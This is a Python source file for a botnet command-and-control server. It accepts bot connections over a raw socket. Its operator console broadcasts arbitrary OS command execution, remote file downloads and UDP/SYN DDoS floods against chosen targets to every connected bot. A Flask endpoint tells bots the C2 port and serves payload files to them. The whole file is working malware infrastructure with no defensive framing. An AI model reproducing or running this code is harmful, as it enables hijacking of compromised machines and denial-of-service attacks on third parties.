import time
import socket
import logging
import threading
from flask import Flask, send_file
from generalFunctions import get_config, detect_lfi

### General constants & variables ###

config = get_config()

app = Flask(__name__)

bots = [] 

FMT = "utf-8"
SOCK_ADDR = (config["cnc_address"], config["cnc_port"])

cnc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
cnc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
cnc.bind(SOCK_ADDR)

# Disabling flask output
log = logging.getLogger("werkzeug")
log.setLevel(logging.ERROR)

### Socket server ###

# Starting sock server (listener)
def start_cnc():
    cnc.listen()
    while True:
        conn, addr = cnc.accept()
        bots.append(conn)

# Sending message to all connected bots
def send_to_all_bots(msg):
    for conn in bots:
        time.sleep(0.05)
        conn.send(msg.encode(FMT))

# Sending commands from cnc
def command_sender():
    time.sleep(1)
    print("\n[*] WELCOME TO BOTNET CNC SERVER\nType 'help' for command listing")

    # Command interface
    while True:
        command = input("\n~$ ")
        if command == "help":
            print("\nCommand list:\n\tactive: get current number of connected bots\n\texec: execute os command in all bots\n\tdownload: download file in all bots\n\tddos: send ddos attack with all bots")

        elif command == "active":
            print(f"Current number of active bots: {len(bots)}")

        elif command == "exec":
            to_exec = input("~$ Type command to execute in all bots: ")
            exec_command = f".exec%{to_exec}"
            threading.Thread(target=send_to_all_bots, args=(exec_command,)).start()

        elif command == "download":
            to_download = input("~$ Type url of the file to download: ")
            to_save = input("~$ Type the name of the file to download (You can also insert a route + file): ")
            download_command = f".download%{to_download}%{to_save}"
            threading.Thread(target=send_to_all_bots, args=(download_command,)).start()

        elif command == "ddos":
            attack_type = input("~$ Select attack type (UDP, SYN): ")
            attack_address = input("~$ Select attack ip address: ")
            attack_port = input("~$ Select attack port: ")
            attack_threads = input("~$ Select attack threads: ")
            attack_time = input("~$ Select attack time (Seconds): ")
            attack_command = f".ddos%{attack_type}%{attack_address}%{attack_port}%{attack_threads}%{attack_time}"
            threading.Thread(target=send_to_all_bots, args=(attack_command,)).start()

# Checking which bots are still connected to cnc
def check_conn_ping(conn):
    conn.settimeout(7)
    try:
        conn.send(".ping".encode(FMT))
        if conn.recv(64).decode(FMT) != ".ping_received":
            bots.remove(conn)
    except: # Bot has timed out
        bots.remove(conn)

def bots_ping():
    while True:
        time.sleep(3)
        for conn in bots:
            while threading.active_count() > 35:
                time.sleep(0.1)
            
            threading.Thread(target=check_conn_ping, args=(conn,)).start()

### Web server ###

# Sending cnc address and port to bot
@app.route("/getcncport", methods=["GET"]) 
def getcncport():
    socketport = str(config["cnc_port"])
    return socketport

# Bot downloading route
@app.route("/download/<file>", methods=["GET"]) 
def download(file):
    lfi = detect_lfi(file)
    if not lfi:
        try:
            return send_file(f"public/{file}", download_name=file)
        except:
            return "Error"
    return "Error"

if __name__ == "__main__":
    print("\n[*] STARTING BOTNET SERVICES ... \n")
    th1 = threading.Thread(target=start_cnc)
    th2 = threading.Thread(target=command_sender)
    th3 = threading.Thread(target=bots_ping)
    th1.start()
    th2.start()
    th3.start()
    app.run(host=config["web_address"], port=config["web_port"], debug=False) # Running flask